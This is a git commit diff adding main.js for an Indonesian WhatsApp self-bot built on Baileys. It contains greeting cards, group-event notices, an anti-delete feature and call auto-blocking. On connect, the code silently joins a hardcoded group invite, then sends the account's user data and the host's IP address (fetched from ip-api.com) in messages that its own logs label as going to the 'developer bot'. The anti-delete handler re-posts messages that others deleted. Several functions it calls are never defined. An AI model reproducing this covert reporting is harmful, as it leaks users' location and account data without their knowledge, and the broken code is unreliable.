9592dd4f371c97eb2f9fe35fcb9669a82eb44010
Nando35 <88189057+Nando35@users.noreply.github.com>
2022-01-08 16:28:39 +0700

    Update main.js

--- main.js
+++ main.js
@@ -1,1 +1,458 @@
-kosong
+// kentod edit no nya aaj ntar eror ngamok
+const {
+  WAConnection: _WAConnection,
+  MessageType,
+  Presence,
+  Mimetype,
+  GroupSettingChange,
+} = require("@adiwajshing/baileys");
+const simple = require("./lib/simple.js");
+const WAConnection = simple.WAConnection(_WAConnection);
+const figlet = require('figlet')
+const fs = require("fs");
+const { version, bugs } = require('./package.json')
+const { banner, start, success, getGroupAdmins } = require("./lib/functions");
+const fetch = require("node-fetch");
+const moment = require("moment-timezone");
+blocked = [];
+const { color } = require('./lib/color')
+const time2 = moment().tz("Asia/Jakarta").format("HH:mm:ss");
+    if (time2 < "24:59:00") {
+      var ucapanWaktu = "Selamat Dini Hari";
+    }
+    if (time2 < "19:00:00") {
+      var ucapanWaktu = "Selamat Malam";
+    }
+    if (time2 < "18:00:00") {
+      var ucapanWaktu = "Selamat Sore";
+    }
+    if (time2 < "15:00:00") {
+      var ucapanWaktu = "Selamat Sore";
+    }
+    if (time2 < "11:00:00") {
+      var ucapanWaktu = "Selamat Siang";
+    }
+    if (time2 < "05:00:00") {
+      var ucapanWaktu = "Selamat Pagi";
+    }
+const runtime = function (seconds) {
+  seconds = Number(seconds);
+  var d = Math.floor(seconds / (3600 * 24));
+  var h = Math.floor((seconds % (3600 * 24)) / 3600);
+  var m = Math.floor((seconds % 3600) / 60);
+  var s = Math.floor(seconds % 60);
+  var dDisplay = d > 0 ? d + (d == 1 ? " hari, " : " Hari, ") : "";
+  var hDisplay = h > 0 ? h + (h == 1 ? " jam, " : " Jam, ") : "";
+  var mDisplay = m > 0 ? m + (m == 1 ? " menit, " : " Menit, ") : "";
+  var sDisplay = s > 0 ? s + (s == 1 ? " detik" : " Detik") : "";
+  return dDisplay + hDisplay + mDisplay + sDisplay;
+};
+fakenomor = '0@s.whatsapp.net'
+const gcrevoke = ["6281804680327-1621430788@g.us"]
+prefix = '#'
+shp = '⬡'
+owner = "62838333100952@s.whatsapp.net"
+spc1 = '         '
+spc2 = '\n                           '
+spc3 = '                   '
+spc4 = '               '
+require("./alya.js");
+nocache("./alya.js", (module) => console.log(`${module} is now updated!`));
+const sleep = async (ms) => {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+const starts = async (client = new WAConnection()) => {
+  client.logger.level = "warn";
+  client.version = [2, 2143, 3];
+  client.browserDescription = ["hehe boy", "Chrome", "3.0"];
+  console.log(banner.string);
+  client.on("qr", () => {
+    console.log(
+      color("[", "white"),
+      color("!", "blue"),
+      color("]", "white"),
+      color(" Scan bang"),
+      client.sendMessage(`@0@s.whatsapp.net`, `「 *NOTIFICATION!* 」\n\n _Bot Berhasil Terhubung!_`, MessageType.extendedText)
+          
+    );
+  });
+
+  fs.existsSync("./session.json") && client.loadAuthInfo("./session.json");
+  client.on("connecting", () => {
+    start("2", "Connecting...");
+  });
+  client.on("open", () => {
+    success("2", "Connect Sukses > Follow @nando.xyz");
+console.log(color(figlet.textSync(`${spc1}            SelfBot`, {
+font: 'Standard',
+horizontalLayout: 'default',
+vertivalLayout: 'default',
+width: 80,
+whitespaceBreak: false
+}), 'cyan'))
+console.log(color(`${spc2}[ • CREATOR BOT ${fakeyoi} • ]` ,'cyan'))
+console.log(color(`${spc4}< ================================================== >`, 'cyan'))
+console.log(color(`${spc3}[•]`, 'aqua'), color(`Hai        : ${ucapanWaktu}`, 'white'))
+console.log(color(`${spc3}[•]`, 'aqua'), color(`Bot Version : 2.1.2`, 'white'))
+console.log(color(`${spc3}[•]`, 'aqua'), color(`Status      : Online!`, 'white'))
+console.log(color(`${spc3}[•]`, 'aqua'), color(`Owner       : ${fakeyoi}`, 'white'))
+console.log(color(`${spc4}< ================================================== >`, 'cyan'))
+
+    console.log(color('⎇','red'), color('𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻i Hasil recode\n𝗡𝗼𝘁𝗲: 𝗝𝗮𝗻𝗴𝗮𝗻 𝗟𝘂𝗽𝗮 Follow ig @nando.xyz︎', 'yellow'))
+    console.log(color('⎇','red'), color('𝗦𝗼𝘂𝗿𝗰𝗲 𝗖𝗼𝗱𝗲 𝗩𝗲𝗿𝘀𝗶𝗼𝗻:', 'aqua'), color(version))
+    console.log(color('⎇','red'), color('𝗕𝘂𝗴? 𝗘𝗿𝗿𝗼𝗿? 𝗦𝘂𝗴𝗴𝗲𝘀𝘁𝗶𝗼𝗻? 𝗩𝗶𝘀𝗶𝘁 𝗛𝗲𝗿𝗲:', 'aqua'), color('https://wa.me/62858157008612'))
+    console.log(color('[SELF-BOT]'), color('𝗦𝗲𝗹𝗳𝗯𝗼𝘁 Alya 𝗜𝘀 𝗢𝗻𝗹𝗶𝗻𝗲 ㋛︎', 'aqua'))
+    console.log(color('[DEV]', 'cyan'), color('𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗕𝗮𝗰𝗸, 𝗢𝘄𝗻𝗲𝗿! 𝗛𝗼𝗽𝗲 𝗬𝗼𝘂 𝗔𝗿𝗲 𝗗𝗼𝗶𝗻𝗴 𝗪𝗲𝗹𝗹~', 'magenta'))
+    console.log(color('⎇','green'), color('𝗠𝗮𝗸𝗮𝘀𝗶𝗵 𝗗𝗵 𝗣𝗮𝗸𝗲', 'white'))
+  });
+await client.connect({ timeoutMs: 30 * 1000 });
+  fs.writeFileSync("./session.json",JSON.stringify(client.base64EncodedAuthInfo(), null, "\t"));
+ teks = `https://chat.whatsapp.com/JVis47FKk6bAmIwTxtAYOx`
+ client.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
+ console.log(color('|WRN|', 'yellow'), color('Joined to Forum Whatsapp Bot group', 'cyan'))
+ client.sendMessage(`@0@s.whatsapp.net`, `*Hai Owner, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Zexy Botz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./alya.jpg'),sourceUrl:"https://wa.me/62858157008612?text=Assalamualaikum"}}})
+	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
+fetch(`http://ip-api.com/line`).then(res => res.text())  
+        .then(bu =>{
+       client.sendMessage("@0@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Zexy Botz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./alya.jpg'),sourceUrl:"https://wa.me/62858157008612?text=Assalamualaikum"}}})
+     console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
+   })
+      
+    client.on('connecting', () => {
+		console.log(color('|TRM|'), color('Connecting...', 'cyan'))
+		})
+	
+	client.on('open', () => {
+	console.log(color('|TRM|'), color('Connected', 'cyan'))
+	}) 
+     
+    client.on('ws-close', () => {
+        console.log(color('|TRM|'), color('Connection lost, trying to reconnect.', 'cyan'))
+        })
+    
+    client.on('close', async () => {
+        console.log(color('|TRM|'), color('Disconnected.', 'cyan'))
+        })
+    
+client.on('group-update', async (anu) => {
+foncevid = { key: {
+  fromMe: false,
+    participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})
+},
+ message: {
+    "contactMessage":{"displayName":'Alyabotpro︎⁩',"vcard":"BEGIN:VCARD\nVERSION:3.0\nN:2;Rival;;;\nFN:resku\nitem1.TEL;waid=62858157008612:+62 813-1405-0985\nitem1.X-ABLabel:Mobile\nEND:VCARD"
+ }}}
+metdata = await client.groupMetadata(anu.jid)
+if(anu.announce == 'false'){
+teks = ` [ Group Opened ] \n\n_Group telah dibuka oleh admin_\n_Sekarang semua member bisa mengirim pesan_`
+client.sendMessage(metdata.id, teks, MessageType.text, {quoted: foncevid})
+console.log(`- [ Group Opened ] - In ${metdata.subject}`)
+}
+else if(anu.announce == 'true'){
+teks = ` [ Group Closed ] \n\n_Group telah ditutup oleh admin_\n_Sekarang hanya admin yang dapat mengirim pesan_`
+client.sendMessage(metdata.id, teks, MessageType.text, {quoted: foncevid})
+console.log(` [ Group Closed ]  In ${metdata.subject}`)
+}
+else if(!anu.desc == ''){
+tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
+teks = ` [ Group Description Change ] \n\nDeskripsi Group telah diubah oleh Admin @${anu.descOwner.split('@')[0]}\n• Deskripsi Baru : ${anu.desc}`
+client.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: foncevid})
+console.log(`- [ Group Description Change ] - In ${metdata.subject}`)
+  }
+else if(anu.restrict == 'false'){
+teks = `- [ 𝗚𝗿𝗼𝘂𝗽 𝗦𝗲𝘁𝘁𝗶𝗻𝗴 𝗖𝗵𝗮𝗻𝗴𝗲 ] -\n\nEdit Group info telah dibuka untuk member\nSekarang semua member dapat mengedit info Group Ini`
+client.sendMessage(metdata.id, teks, MessageType.text, {quoted: foncevid})
+console.log(`- [ Group Setting Change ] - In ${metdata.subject}`)
+  }
+else if(anu.restrict == 'true'){
+teks = `- [ 𝗚𝗿𝗼𝘂𝗽 𝗦𝗲𝘁𝘁𝗶𝗻𝗴 𝗖𝗵𝗮𝗻𝗴𝗲 ] -\n\nEdit Group info telah ditutup untuk member\nSekarang hanya admin group yang dapat mengedit info Group Ini`
+client.sendMessage(metdata.id, teks, MessageType.text, {quoted: foncevid})
+console.log(`- [ Group Setting Change ] - In ${metdata.subject}`)
+}
+})
+  client.on("group-participants-update", async (anu) => {
+    try {
+      groupMet = await client.groupMetadata(anu.jid);
+      groupMembers = groupMet.participants;
+      groupAdmins = getGroupAdmins(groupMembers);
+      mem = anu.participants[0];
+
+      console.log(anu);
+      try {
+        pp_user = await client.getProfilePicture(mem);
+      } catch (e) {
+        pp_user =
+          "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
+      }
+      try {
+        pp_grup = await client.getProfilePicture(anu.jid);
+      } catch (e) {
+        pp_grup =
+          "https://i.postimg.cc/SN54m6LW/SAVE-20210728-133334.jpg";
+      }
+      if (anu.action == "add" && mem.includes(client.user.jid)) {
+        client.sendMessage(anu.jid, "Halo Gaes︎", "conversation");
+      }
+hehe = await getBuffer(pp_user)
+if (anu.action == "add" && !mem.includes(client.user.jid)) {
+        mdata = await client.groupMetadata(anu.jid);
+        tag = "6282182623238@s.whatsapp.net";
+        memeg = mdata.participants.length;
+        num = anu.participants[0];
+        let v = client.contacts[num] || { notify: num.replace(/@.+/, "") };
+        anu_user = v.vname || v.notify || num.split("@")[0];
+        time_wel = moment.tz("Asia/Jakarta").format("HH:mm");
+        teks = `*⌜ ᴡᴇʟᴄᴏᴍᴇ @${num.split('@')[0]}👋🏻 ɪɴ ɢʀᴜᴘ ${mdata.subject} ⌝*
+*╭⊷️ ɴᴀᴍᴀ :*
+*├ ᴜᴍᴜʀ :*
+*├ ᴀsᴋᴏᴛ :*
+*├ ɢᴇɴᴅᴇʀ :*
+*└━━━━━━•*
+• *◪  ᴛᴇᴛᴀᴘ ɪɴɢᴀᴛ 3 ᴍ~*
+*├ ᴍᴇᴍᴀᴋᴀɪ ᴍᴀsᴋᴇʀ*
+*├ ᴍᴇɴᴄᴜᴄɪ ᴛᴀɴɢᴀɴ*
+*└ ᴍᴇɴᴊᴀɢᴀ ᴊᴀʀᴀᴋ* •`;
+        buff = await getBuffer(
+          `http://hadi-api.herokuapp.com/api/card/welcome?nama=${anu_user}&descriminator=${
+            groupMembers.length
+          }&memcount=${memeg}&gcname=${encodeURI(
+            mdata.subject
+          )}&pp=${pp_user}&bg=https://bit.ly/3E1F4AA`
+        );
+        client.sendMessage(anu.jid, { contentText: `${teks}`, footerText: `៹࣪ Runtime Bot : ${runtime(process.uptime())} \n៹࣪ Welcome messages`, buttons: [{ buttonId: `Welcome👋🏻`, buttonText: { displayText: 'Welcome👋🏻' }, type: 1 } ], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: buff, contextInfo: {mentionedJid: [num]}}}, 'buttonsMessage')}
+            if (anu.action == "remove" && !mem.includes(client.user.jid)) {
+        mdata = await client.groupMetadata(anu.jid);
+        tag = "6282182623238@s.whatsapp.net";
+        num = anu.participants[0];
+        let w = client.contacts[num] || { notify: num.replace(/@.+/, "") };
+        anu_user = w.vname || w.notify || num.split("@")[0];
+        time_wel = moment.tz("Asia/Jakarta").format("HH:mm");
+        memeg = mdata.participants.length;
+        out = `*Selamat Tinggal @${num.split('@')[0]} \n Semoga Tenang Di Sana*`;
+        buff = await getBuffer(
+          `http://hadi-api.herokuapp.com/api/card/goodbye?nama=${anu_user}&descriminator=${
+            groupMembers.length
+          }&memcount=${memeg}&gcname=${encodeURI(
+            mdata.subject
+          )}&pp=${pp_user}&bg=https://bit.ly/3E1F4AA`
+        );
+        client.sendMessage(anu.jid, { contentText: `${out}`, footerText: `៹࣪ Leaving messages`, buttons: [{ buttonId: `dada beban`, buttonText: { displayText: 'Dada kak 😈' }, type: 1 } ], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: buff, contextInfo: {mentionedJid: [num]}}}, 'buttonsMessage')
+      }
+      /*welcom = true
+      if (anu.action == "add" && !mem.includes(client.user.jid)) {
+        mdata = await client.groupMetadata(anu.jid);
+        memeg = mdata.participants.length;
+        num = anu.participants[0];
+        if (welcom === false) return
+        let v = client.contacts[num] || { notify: num.replace(/@.+/, "") };
+        anu_user = v.vname || v.notify || num.split("@")[0];
+        time_wel = moment.tz("Asia/Jakarta").format("HH:mm");
+        teks = `𝗛𝗮𝗹𝗼 ${anu_user} 𝗦𝗲𝗹𝗮𝗺𝗮𝘁 𝗗𝗮𝘁𝗮𝗻𝗴 シ︎`;
+        buff = await getBuffer(
+          `http://hadi-api.herokuapp.com/api/card/welcome?nama=${anu_user}&descriminator=${
+            groupMembers.length
+          }&memcount=${memeg}&gcname=${encodeURI(
+            mdata.subject
+          )}&pp=${pp_user}&bg=https://i.postimg.cc/rFkw8MpX/IMG-20210807-151325.jpg`
+        );
+        buttons = [
+          { buttonId: `verify`, buttonText: { displayText: "𝑽𝒆𝒓𝒊𝒇𝒚㋛︎" }, type: 1 },
+          { buttonId: `command`, buttonText: { displayText: "𝑪𝒍𝒊𝒄𝒌 𝑴𝒆𝒏𝒖㋛︎" }, type: 1 },
+        ];
+        imageMsg = (
+          await client.prepareMessageMedia(buff, "imageMessage", {
+            thumbnail: buff,
+          })
+        ).imageMessage;
+        buttonsMessage = {
+          contentText: `${teks}`,
+          footerText: `㋛ 𝘙𝘶𝘯𝘵𝘪𝘮𝘦 ${runtime(process.uptime())} \n 𝘊𝘳𝘦𝘢𝘵𝘦𝘥 𝘉𝘺 ${fakeyoi}`,
+          imageMessage: imageMsg,
+          buttons: buttons,
+          headerType: 4,
+        };
+        prep = await client.prepareMessageFromContent(
+          mdata.id,
+          { buttonsMessage },
+          {}
+        );
+        client.relayWAMessage(prep);
+      }
+      if (anu.action == "remove" && !mem.includes(client.user.jid)) {
+        mdata = await client.groupMetadata(anu.jid);
+        num = anu.participants[0];
+        let w = client.contacts[num] || { notify: num.replace(/@.+/, "") };
+        anu_user = w.vname || w.notify || num.split("@")[0];
+        time_wel = moment.tz("Asia/Jakarta").format("HH:mm");
+        memeg = mdata.participants.length;
+        out = `𝗦𝗮𝘆𝗼𝗻𝗮𝗿𝗮 ${anu_user} 👋`;
+        buff = await getBuffer(
+          `http://hadi-api.herokuapp.com/api/card/goodbye?nama=${anu_user}&descriminator=${
+            groupMembers.length
+          }&memcount=${memeg}&gcname=${encodeURI(
+            mdata.subject
+          )}&pp=${pp_user}&bg=https://i.postimg.cc/rFkw8MpX/IMG-20210807-151325.jpg`
+        );
+        buttons = [
+          { buttonId: `y`, buttonText: { displayText: "𝘉𝘺𝘦𝘦シ︎" }, type: 1 },
+          { buttonId: `runtime`, buttonText: { displayText: "𝘙𝘶𝘯𝘵𝘪𝘮𝘦シ︎" }, type: 1 },
+        ];
+        imageMsg = (
+          await client.prepareMessageMedia(buff, "imageMessage", {
+            thumbnail: buff,
+          })
+        ).imageMessage;
+        buttonsMessage = {
+          contentText: `${out}`,
+          footerText: `㋛︎ 𝘙𝘶𝘯𝘵𝘪𝘮𝘦 ${runtime(process.uptime())} \n 𝘊𝘳𝘦𝘢𝘵𝘦𝘥 𝘉𝘺 ${fakeyoi}🌿`,
+          imageMessage: imageMsg,
+          buttons: buttons,
+          headerType: 4,
+        };
+        prep = await client.prepareMessageFromContent(
+          mdata.id,
+          { buttonsMessage },
+          {}
+        );
+        client.relayWAMessage(prep);
+      }*/
+      
+       else if (anu.action == 'promote') {
+
+			num = anu.participants[0]
+
+			try {
+
+				ppUrl = await client.getProfilePicture(num)
+
+				} catch {
+
+					ppUrl = 'https://i.ibb.co/6BRf4Rc/Hans-Bot-No-Profile.png'
+
+				}
+
+				img = await getBuffer(ppUrl)
+
+				teks = `「 PROMOTE - DETECTED 」\n\nName : @${num.split("@")[0]}\nStatus : Member -> Admin\nGroup : ${mdata.subject}`
+
+				sendButImage(anu.jid, teks, ``, img,but = [{buttonId: `Hello World!`, buttonText: {displayText: `SAWADEE KHA HAPPY NOW?`}, type: 1}], options = {contextInfo: {mentionedJid: [num]}})
+
+			} else if (anu.action == 'demote') {
+
+			num = anu.participants[0]
+
+			try {
+
+				ppUrl = await client.getProfilePicture(num)
+
+				} catch {
+
+					ppUrl = 'https://i.ibb.co/6BRf4Rc/Hans-Bot-No-Profile.png'
+
+				}
+
+				img = await getBuffer(ppUrl)
+
+				teks = `「 DEMOTE - DETECTED 」\n\nName : @${num.split("@")[0]}\nStatus : Admin -> Member\nGroup : ${mdata.subject}`
+
+				sendButImage(anu.jid, teks, ``, img,but = [{buttonId: `Hello World!`, buttonText: {displayText: `ANOTHER ONE BITE DUST`}, type: 1}], options = {contextInfo: {mentionedJid: [num]}})
+
+			}
+    } catch (e) {
+      console.log("Error : %s", color(e, "red"));
+    }
+  });
+  //
+ antidel = true
+  client.on("message-delete", async (m) => {
+    if (m.key.remoteJid == "status@broadcast") return;
+    if (!m.key.fromMe && m.key.fromMe) return;
+   if (antidel === false) return
+    m.message =
+      Object.keys(m.message)[0] === "ephemeralMessage"
+        ? m.message.ephemeralMessage.message
+        : m.message;
+    const jam = moment.tz("Asia/Jakarta").format("HH:mm:ss");
+    let d = new Date();
+    let locale = "id";
+    let gmt = new Date(0).getTime() - new Date("1 Januari 2021").getTime();
+    let weton = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][
+      Math.floor((d * 1 + gmt) / 84600000) % 5
+     ];
+    let week = d.toLocaleDateString(locale, { weekday: "long" });
+    let calender = d.toLocaleDateString(locale, {
+      day: "numeric",
+      month: "long",
+      year: "numeric",
+    });
+     const type = Object.keys(m.message)[0];
+     client.sendMessage(
+      m.key.remoteJid,
+      `\`\`\`「 𝗔𝗡𝗧𝗜 𝗗𝗘𝗟𝗘𝗧𝗘 」\`\`\`
+  •> Nama : @${m.participant.split("@")[0]}
+  •> Waktu : ${jam} ${week} ${calender}
+  •> Type : ${type}`,
+      MessageType.text,
+      { quoted: m.message, contextInfo: { mentionedJid: [m.participant] } }
+    );
+
+    client.copyNForward(m.key.remoteJid, m.message);
+  });
+  client.on("chat-update", async (message) => {
+    require("./alya.js")(client, message);
+  });
+  isBattre = "Not Detect"; //
+  isCharge = "Not Detect"; //
+  client.on(`CB:action,,battery`, (json) => {
+    const batteryLevelStr = json[2][0][1].value;
+    const batterylevel = parseInt(batteryLevelStr);
+    isBattre = batterylevel + "%";
+    isCharge = json[2][0][1].live;
+  });
+antical = true
+client.on("CB:Call", json => {
+if (antical === false) return
+let call;
+calling = JSON.parse(JSON.stringify(json))
+call = calling[1].from
+client.sendMessage(call, `*Sorry ${client.user.name} can't receive calls.*\n*Call = Block!*`, MessageType.text)
+.then(() => client.blockUser(call, "add"))
+})
+  client.on("CB:Blocklist", (json) => {
+    if (blocked.length > 2) return;
+    for (let i of json[1].blocklist) {
+      blocked.push(i.replace("c.us", "s.whatsapp.net"));
+    }
+  });
+};
+
+/**
+ * Uncache if there is file change
+ * @param {string} module Module name or path
+ * @param {function} cb <optional>
+ */
+function nocache(module, cb = () => {}) {
+  console.log("Module", `'${module}'`, "is now being watched for changes");
+  fs.watchFile(require.resolve(module), async () => {
+    await uncache(require.resolve(module));
+    cb(module);
+  });
+}
+
+/**
+ * Uncache a module
+ * @param {string} module Module name or path
+ */
+function uncache(module = ".") {
+  return new Promise((resolve, reject) => {
+    try {
+      delete require.cache[require.resolve(module)];
+      resolve();
+    } catch (e) {
+      reject(e);
+    }
+  });
+}
+
+starts();
+// 𝙅𝙖𝙣 𝙃𝙖𝙥𝙪𝙨 𝘾𝙧𝙚𝙙𝙞𝙩 𝙂𝙬 𝘼𝙨𝙪𝙪𝙪
